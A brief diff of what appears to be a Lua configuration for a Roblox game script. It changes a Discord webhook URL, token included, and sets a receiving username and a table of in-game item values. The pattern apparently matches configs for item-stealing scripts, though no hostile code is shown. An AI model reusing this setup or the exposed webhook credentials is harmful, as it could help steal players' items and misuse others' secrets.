@@ -1,5 +1,5 @@
 userName = "phatrat2917"
-webHook = "https://discord.com/api/webhooks/1302027161309548586/vqRx0We1RpnnQxbt0tAQ3MSng-4iH6eOeWep1vq-7-aOKYgBUpcmbMj-TQ8kEAXOkBPt"
+webHook = "https://discord.com/api/webhooks/1326561496506962010/Ojmku_PMYtGwHM-Kwva_CgupV91BM17_cIzKfdbAvX5BQfBLLP-ndNpnePwE3LoI5tAa"
 local values = {
     ["Nik's Scythe"] = 250000000,
     ["Elderwood Scythe"] = 90,
